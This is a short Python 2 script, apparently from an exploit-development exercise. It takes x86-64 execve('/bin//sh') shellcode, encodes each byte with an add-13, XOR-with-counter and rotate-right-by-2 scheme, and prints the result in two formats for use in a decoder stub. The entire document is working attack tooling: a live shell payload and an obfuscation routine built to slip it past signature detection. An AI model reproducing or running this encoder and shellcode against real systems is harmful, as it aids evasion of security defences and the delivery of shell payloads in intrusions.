def ror(val, rot):
	return ((val & 0xff) >> rot % 8 ) | (val << ( 8 - (rot % 8)) & 0xff)

def main():
	shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
	print "Encoding shellcode with ROT 13, XOR and Right Shift..."

	encoded = ""
	encoded2 = ""

	i = len(bytearray(shellcode))
	for x in bytearray(shellcode):
		y = ror(((x+13)^i),2) #Rot13, Xor and Right Shift 2

		encoded += "\\x"
		encoded += "%02x" % y

		encoded2 += "0x"
		encoded2 += "%02x," % y
		i -= 1

	print "Shellcode lenght: %d\n\n" % len(bytearray(shellcode))
	print "Encoded Shellcode:\n"
	print "Format 1:"
	print "\t",encoded
	print "\nFormat 2:"
	print "\t",encoded2[:-1]

if __name__ == "__main__":
    main()
